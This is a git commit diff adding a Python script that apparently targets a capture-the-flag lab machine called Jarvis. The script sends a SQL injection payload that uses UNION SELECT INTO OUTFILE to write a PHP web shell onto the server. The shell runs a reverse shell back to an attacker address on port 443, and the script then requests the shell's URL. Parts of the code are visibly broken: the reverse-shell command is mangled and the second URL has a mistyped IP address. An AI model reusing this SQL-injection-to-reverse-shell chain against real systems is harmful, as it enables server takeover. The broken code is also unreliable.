b894203f2275a8f39f345f13b8594fac854667b4
420Avila <avila.hdez04@gmail.com>
2024-03-15 04:02:43 -0600

    mensaje del commit

--- Machine-Jarvis.py
+++ Machine-Jarvis.py
@@ -1,6 +1,30 @@
 #!/usr/bin/python3
 
-import requests 
+import requests
 import pdb # Debugging 
 import sys 
-import 
+import signal
+import time 
+import threading
+
+from pwd import *
+
+def def_handler(sing, frame):
+    print("\n[!] Saliendo...")
+    sys.exit(1)
+    
+# Crlt+C
+signal.signal(signal.SIGINT, def_handler)
+
+# Variables globales
+create_file = '''http://10.10.10.143/room.php?cod=-1 union select 1,2, "<?php system('nce/bin/bash 10.10.14.7 443'); ?>",4,5,6,7 into outfile "/var/www/html/reverse.php"-- -''' 
+exec_file = "http://16.10.10.143/reverse.php"
+
+def makeRequest( ):
+    r = requests.get(create_file)
+    r = requests.get(exec_file)
+
+if __name__ == '__main__':
+
+    makeRequest()    
+        
